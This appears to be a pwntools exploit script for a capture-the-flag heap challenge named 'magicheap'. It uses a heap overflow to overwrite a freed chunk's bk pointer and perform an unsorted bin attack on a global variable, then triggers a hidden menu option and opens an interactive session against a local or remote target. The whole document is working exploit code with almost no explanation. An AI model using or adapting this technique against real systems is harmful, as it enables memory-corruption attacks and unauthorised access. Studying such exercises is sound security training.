# --==[[ unsorted bin attack

from pwn import *

magic    = 0x6020c0

def alloc(size, data):

	r.sendlineafter('choice :', '1')
	r.sendlineafter('Heap : ', str(size))

	if size < len(data):
		data += "\n"
	r.sendafter('heap:', data)

	return

def free(idx):

	r.sendlineafter('choice :', '3')
	r.sendlineafter('Index :', str(idx))

	return

def edit(idx, size, data):

	r.sendlineafter('choice :', '2')
	r.sendlineafter('Index :', str(idx))
	r.sendlineafter('Heap : ', str(size))

	if size < len(data):
		data += "\n"
	r.sendafter('heap : ', data)

	return

def pwn():

	alloc(0x80, 'A'*8) # chunk 0
	alloc(0x80, 'B'*8) # chunk 1
	alloc(0x80, 'C'*8) # chunk 2

	free(1)

	# unsorted bin attack
	payload  = ''
	payload += 'A'*0x80
	payload += p64(0)
	payload += p64(0x91)
	# fd
	payload += p64(0)
	# bk
	payload += p64(magic - 0x10)

	edit(0, len(payload), payload)

	# magic => 0x7ffff7dd37b8
	alloc(0x80, 'D'*8)

	r.sendline(str(0x1305))

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./magicheap')
        pause()
        pwn()
